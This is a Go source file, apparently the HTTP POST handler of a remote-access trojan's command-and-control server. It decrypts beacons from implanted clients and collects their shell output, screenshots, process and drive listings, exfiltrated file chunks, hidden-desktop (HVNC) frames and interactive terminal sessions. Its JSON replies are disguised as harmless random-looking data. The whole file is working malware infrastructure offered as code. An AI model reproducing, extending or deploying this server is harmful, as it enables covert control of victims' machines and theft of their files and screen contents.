package communication

import (
	"BackendTemplate/pkg/command"
	"BackendTemplate/pkg/database"
	"BackendTemplate/pkg/encrypt"
	"BackendTemplate/pkg/utils"
	"encoding/base64"
	"encoding/binary"
	"encoding/json"
	"io"
	"log"
	"net/http"
	"strings"
	"BackendTemplate/pkg/utils/logx"
)

// XTerm会话广播函数，由api包在初始化时设置（用于交互式终端输出路由）
var BroadcastToXTermSessions func(uid string, data []byte)

// HVNC会话广播函数，由api包在初始化时设置
var BroadcastToHVNCSessions func(uid, sid string, frame []byte)

// gbkToUtf8 将GBK编码转换为UTF-8 (已迁移到utils.ProcessShellOutput)
func gbkToUtf8(data []byte) ([]byte, error) {
	// 使用新的统一编码处理器
	return utils.ProcessShellOutput(data)
}

func PostHttp(w http.ResponseWriter, r *http.Request) {
	encryptMetainfo := extractMetadata(r)

	tmpMetainfo, err := encrypt.DecodeBase64([]byte(encryptMetainfo))
	if err != nil {
		w.Header().Set("Content-Type", "application/json")
		w.WriteHeader(http.StatusInternalServerError)

		// 返回 JSON 数据
		json.NewEncoder(w).Encode(map[string]string{
			"error": "Something went wrong",
		})
		return
	}
	// https 是 http 协议族的 TLS 包装：与 GetHttp 对齐，按传输层 TLS 判定监听器类型。
	// http/https 为不同 type 的监听器、各持独立 VKey/盐——固定查 "http" 会导致
	// https 监听器配独立密钥时 POST 通道 MetaInfo 解密必失败（客户端只能收命令、无法回传结果）。
	listenerType := "http"
	if r.TLS != nil {
		listenerType = "https"
	}
	metaMK, metaSalt := encrypt.GetListenerKeyConfig(listenerType)
	// J4: 拒绝公开默认密钥连接（与 GetHttp 对齐，两通道防护一致）
	if encrypt.IsDefaultListenerKey(metaMK, metaSalt) {
		logx.Warnf("⚠️ [HTTP-POST] 监听器使用公开默认密钥，拒绝连接\n")
		w.Header().Set("Content-Type", "application/json")
		w.WriteHeader(http.StatusForbidden)
		json.NewEncoder(w).Encode(map[string]string{"error": "监听器默认密钥被拒绝"})
		return
	}
	metainfo, err := encrypt.DecryptWithMasterKeyRaw(tmpMetainfo, metaMK)
	if err != nil {
		w.Header().Set("Content-Type", "application/json")
		w.WriteHeader(http.StatusInternalServerError)

		// 返回 JSON 数据
		json.NewEncoder(w).Encode(map[string]string{
			"error": "Something went wrong",
		})
		return
	}
	// FirstBlood 元数据长度校验
	if len(metainfo) < 10 {
		w.Header().Set("Content-Type", "application/json")
		w.WriteHeader(http.StatusInternalServerError)
		json.NewEncoder(w).Encode(map[string]string{"error": "bad metainfo"})
		return
	}
	uid := encrypt.BytesToMD5(metainfo)

	// 请求体大小限制，防止无界读取
	r.Body = http.MaxBytesReader(w, r.Body, 64*1024*1024) // 64MB
	dataValue, err := io.ReadAll(r.Body)
	if err != nil {
		logx.Errorf("❌ [HTTP-POST] 读取请求体失败: %v\n", err)
		w.Header().Set("Content-Type", "application/json")
		w.WriteHeader(http.StatusBadRequest)
		json.NewEncoder(w).Encode(map[string]string{
			"error": "Failed to read request body",
		})
		return
	}

	//dataValue := c.GetHeader("X-AUTH")
	dataBytes, err := encrypt.DecodeBase64([]byte(dataValue))
	if err != nil {
		logx.Errorf("❌ [HTTP-POST] Base64解码失败: %v\n", err)
		w.Header().Set("Content-Type", "application/json")
		w.WriteHeader(http.StatusBadRequest)
		json.NewEncoder(w).Encode(map[string]string{
			"error": "Failed to decode base64 data",
		})
		return
	}

	// 尝试使用高级会话密钥解密（与TCP保持一致）
	logx.Infof("🔓 [%s-POST] 开始解密 - UID: %s, 原始数据长度: %d\n", listenerType, uid, len(dataBytes))
	logx.Infof("🔓 [HTTP-POST] 原始加密数据: %x\n", dataBytes[:min(len(dataBytes), 32)])

	dataBytes, err = encrypt.DecryptWithSessionKey(dataBytes, uid)
	if err != nil {
		// 【加密体系改造】会话密钥解密失败直接报错，不再回落旧加密
		logx.Errorf("❌ [HTTP-POST] 会话密钥解密失败: %v\n", err)
		w.Header().Set("Content-Type", "application/json")
		w.WriteHeader(http.StatusBadRequest)
		json.NewEncoder(w).Encode(map[string]string{"error": "会话密钥解密失败"})
		return	}

	// 调试信息：显示解密后的数据
	logx.Infof("🔓 [HTTP-POST] 解密后数据长度: %d\n", len(dataBytes))
	if len(dataBytes) >= 4 {
		logx.Infof("🔓 [HTTP-POST] 解密后数据头部: %x\n", dataBytes[:min(len(dataBytes), 32)])
	}

	// 检查数据长度，防止slice bounds错误
	if len(dataBytes) < 4 {
		logx.Errorf("❌ [HTTP-POST] 数据长度不足: 需要至少4字节，实际收到%d字节, UID: %s\n", len(dataBytes), uid)
		w.Header().Set("Content-Type", "application/json")
		w.WriteHeader(http.StatusBadRequest)
		json.NewEncoder(w).Encode(map[string]string{
			"error": "Insufficient data length",
		})
		return
	}

	replyTypeBytes := dataBytes[:4]
	data := dataBytes[4:]
	replyType := binary.BigEndian.Uint32(replyTypeBytes)

	logx.Infof("📨 [HTTP-POST] 处理消息 - UID: %s, 消息类型: %d, 数据长度: %d\n", uid, replyType, len(data))
	switch replyType {
	case 0: //命令行展示或截图数据
		// 智能判断：结合命令上下文和数据格式检查
		isExpectedScreenshot := command.VarScreenshotQueue.IsScreenshotExpected(uid)
		isImageFormat := command.IsImageData(data)

		// 【关键调试】详细分析数据特征
		logx.Debugf("🔍 [HTTP] 数据分析 - UID: %s, 数据长度: %d, 期望截图: %t, 图像格式: %t\n",
			uid, len(data), isExpectedScreenshot, isImageFormat)

		// 如果期望截图，显示数据前缀用于调试
		if isExpectedScreenshot {
			dataPrefix := string(data[:min(100, len(data))])
			logx.Debugf("🔍 [HTTP] 期望截图数据前缀: %s\n", dataPrefix)
			logx.Debugf("🔍 [HTTP] 数据是否以data:image开头: %t\n", strings.HasPrefix(dataPrefix, "data:image"))
		}

		// 【修复关键】优化截图数据判断逻辑
		// 只要期望截图且数据量合理，就认为是截图数据
		if isExpectedScreenshot && len(data) > 1024 {
			// 进一步检查：要么是图像格式，要么数据量很大（可能是data URI）
			if isImageFormat || len(data) > 100000 {
				logx.Infof("✅ [HTTP] 确认为截图数据 - UID: %s\n", uid)

				// 处理截图数据
				logx.Infof("📷 [HTTP] 收到客户端截图数据 - UID: %s, 原始数据长度: %d\n", uid, len(data))

				// 检查数据是否已经是base64格式的Data URI
				var screenshotDataURI string
				if len(data) > 22 && strings.HasPrefix(string(data), "data:image/") {
					// 数据已经是完整的Data URI格式
					screenshotDataURI = string(data)
					logx.Infof("📷 [HTTP] 截图数据已是完整的Data URI格式 - UID: %s\n", uid)
				} else {
					// 原始二进制数据，需要转换为base64
					screenshotDataURI = "data:image/png;base64," + base64.StdEncoding.EncodeToString(data)
					logx.Infof("📷 [HTTP] 将原始数据转换为Data URI格式 - UID: %s\n", uid)
				}

				logx.Infof("📷 [HTTP] 正在将截图数据发送到队列 - UID: %s, 数据长度: %d\n", uid, len(screenshotDataURI))
				command.VarScreenshotQueue.Add(uid, screenshotDataURI)

				// 清除截图期望状态
				command.VarScreenshotQueue.SetScreenshotExpected(uid, false)
			} else {
				logx.Warnf("⚠️ [HTTP] 期望截图但数据格式检查失败 - UID: %s, 长度: %d, 图像格式: %t\n", uid, len(data), isImageFormat)
				// 作为普通命令输出处理
				utf8Data, encodeErr := gbkToUtf8(data)
				if encodeErr != nil {
					utf8Data = data
				}
				// 统一走增量追加（避免读改写整 blob 的 IO 放大与并发覆盖）
				database.AppendShellContent(uid, string(utf8Data)+"\n")
			}
		} else {
			// 当作普通命令行输出处理
			if !isExpectedScreenshot && len(data) > 100000 {
				logx.Warnf("⚠️ [HTTP] 大数据包但非截图上下文 - UID: %s, 长度: %d, 可能是其他大文件传输\n", uid, len(data))
			}

			// 应用编码转换解决中文乱码问题
			utf8Data, encodeErr := gbkToUtf8(data)
			if encodeErr != nil {
				// 如果编码转换失败，使用原始数据
				utf8Data = data
			}

			outputStr := string(utf8Data)

			// 统一走增量追加（避免读改写整 blob 的 IO 放大与并发覆盖）
			database.AppendShellContent(uid, outputStr+"\n")
		}
	case command.PS:
		// 应用编码转换解决中文乱码问题
		utf8Data, encodeErr := gbkToUtf8(data)
		if encodeErr != nil {
			// 如果编码转换失败，使用原始数据
			utf8Data = data
		}
		command.VarPidQueue.Add(uid, string(utf8Data))
	case command.FileBrowse:
		// 应用编码转换解决中文乱码问题
		utf8Data, encodeErr := gbkToUtf8(data)
		if encodeErr != nil {
			// 如果编码转换失败，使用原始数据
			utf8Data = data
		}
		command.VarFileBrowserQueue.Add(uid, string(utf8Data))
		case 22: //文件下载第一条信息（v2：fileLen(8)|requestId(4)|path）
			if len(data) < 12 {
				logx.Warnf("⚠️ 文件下载信息数据长度不足 - UID: %s, 数据长度: %d\n", uid, len(data))
				break
			}
			fileLen := int64(binary.BigEndian.Uint64(data[:8]))
			downloadReqID := binary.BigEndian.Uint32(data[8:12])
			filePath := string(data[12:])
			database.Engine.QueryString(`UPDATE downloads SET file_size = ?, downloaded_size = ? WHERE uid = ? AND file_path = ?;`, fileLen, 0, uid, filePath)
			if err := command.VarDownloadFiles.Start(uid, downloadReqID, filePath); err != nil {
				logx.Errorf("❌ 下载文件打开失败 - UID: %s, 错误: %v\n", uid, err)
			}
		case command.DOWNLOAD: //文件下载分块（v2：requestId(4)|chunk）
			if len(data) < 4 {
				logx.Warnf("⚠️ 文件下载数据长度不足 - UID: %s\n", uid)
				break
			}
			downloadReqID := binary.BigEndian.Uint32(data[:4])
			fileContent := data[4:]
			if ok, err := command.VarDownloadFiles.Append(uid, downloadReqID, fileContent); err != nil {
				logx.Errorf("❌ 文件下载写入失败 - UID: %s, 错误: %v\n", uid, err)
				break
			} else if ok {
				// 走批量进度队列（内存累计 + 定时合并落库），避免每分块一次 SQLite 写事务
				database.QueueDownloadProgress(uid, int64(len(fileContent)))
			}
	case command.DRIVES:
		// 应用编码转换解决中文乱码问题
		utf8Data, encodeErr := gbkToUtf8(data)
		if encodeErr != nil {
			// 如果编码转换失败，使用原始数据
			utf8Data = data
		}
		drives := utils.GetExistingDrives(utf8Data)
		command.VarDrivesQueue.Add(uid, drives)
	case command.SCREENSHOT1:
		// 屏幕截图操作完成，将截图数据加入队列
		log.Printf("📷 收到客户端通信截图数据 - UID: %s, 原始数据长度: %d", uid, len(data))

		// 检查数据是否已经是base64格式的Data URI
		var screenshotDataURI string
		if strings.HasPrefix(string(data), "data:image/") {
			// 数据已经是完整的Data URI格式
			screenshotDataURI = string(data)
			log.Printf("📷 通信截图数据已是完整的Data URI格式 - UID: %s", uid)
		} else {
			// 原始二进制数据，需要转换为base64
			screenshotDataURI = "data:image/png;base64," + base64.StdEncoding.EncodeToString(data)
			log.Printf("📷 将通信原始数据转换为Data URI格式 - UID: %s", uid)
		}

		log.Printf("📷 正在将通信截图数据发送到队列 - UID: %s, 数据长度: %d", uid, len(screenshotDataURI))
		command.VarScreenshotQueue.Add(uid, screenshotDataURI)
	case command.MONITOR_FRAME:
		// 监控帧数据 - 【关键修复】正确处理二进制图像数据
		log.Printf("📺 [监控帧] 收到HTTP客户端监控帧数据 - UID: %s, 数据长度: %d", uid, len(data))

		// 检查数据是否已经是base64格式的Data URI
		var monitorDataURI string
		if strings.HasPrefix(string(data), "data:image/") {
			// 数据已经是完整的Data URI格式
			monitorDataURI = string(data)
			log.Printf("📺 [监控帧] HTTP监控帧数据已是完整的Data URI格式 - UID: %s", uid)
		} else {
			// 原始二进制数据，需要转换为base64
			monitorDataURI = "data:image/png;base64," + base64.StdEncoding.EncodeToString(data)
			log.Printf("📺 [监控帧] 将HTTP原始数据转换为Data URI格式 - UID: %s", uid)
		}

		// 【关键修复】传递转换后的Data URI而不是原始数据
		command.VarMonitorFrameQueue.Add(uid, []byte(monitorDataURI))
	case command.HVNC_FRAME:
		// HVNC 隐藏桌面帧 - [4B sidLen][sid][JPEG]
		sid, jpeg, ok := command.ParseHVNCFrame(data)
		if !ok {
			break
		}
		command.VarHVNCFrameQueue.Add(uid, sid, jpeg)
		if BroadcastToHVNCSessions != nil {
			BroadcastToHVNCSessions(uid, sid, jpeg)
		}
	case command.FILE_EDIT_READ:
		command.HandleFileEditRead(uid, data)
	case command.FILE_EDIT_WRITE:
		command.HandleFileEditWrite(uid, data)
	case command.UPLOAD_ACK:
		command.HandleUploadAck(uid, data)
	case command.FILE_OP_RESULT:
		command.HandleFileOpResult(uid, data)
	case command.INTERACTIVE_SHELL_START:
		// 交互式终端启动确认 - 不需要特殊处理，只是确认客户端收到命令
		log.Printf("✅ [XTerm-HTTP] 客户端确认交互式终端启动: %s", uid)

	case command.INTERACTIVE_SHELL_STOP:
		// 交互式终端停止确认
		log.Printf("🛑 [XTerm-HTTP] 客户端确认交互式终端停止: %s", uid)

	case command.INTERACTIVE_SHELL_INPUT:
		// 交互式终端输出数据 - 路由到XTerm会话
		if len(data) > 5 {
			log.Printf("📤 [XTerm-HTTP] 收到终端输出数据: UID=%s, 长度: %d", uid, len(data))
		}
		if BroadcastToXTermSessions != nil {
			BroadcastToXTermSessions(uid, data)
		} else {
			log.Printf("⚠️ [XTerm-HTTP] BroadcastToXTermSessions函数未设置")
		}
	}
	var pos1, pos2, pos3 []byte
	pos1, _ = encrypt.EncodeBase64(encrypt.GenRandomBytes())
	pos2, _ = encrypt.EncodeBase64(encrypt.GenRandomBytes())
	pos3 = []byte{}
	response := map[string]interface{}{
		"data": map[string]interface{}{
			"log_id": encrypt.GenRandomLogID(),
			"action_rule": map[string][]byte{
				"pos_1": pos1,
				"pos_2": pos2,
				"pos_3": pos3,
			},
		},
	}

	// 设置 Content-Type 为 JSON
	w.Header().Set("Content-Type", "application/json")
	w.WriteHeader(http.StatusOK)

	// 编码 JSON 并写入响应
	json.NewEncoder(w).Encode(response)
}

// 辅助函数：获取两个数的最小值
func min(a, b int) int {
	if a < b {
		return a
	}
	return b
}

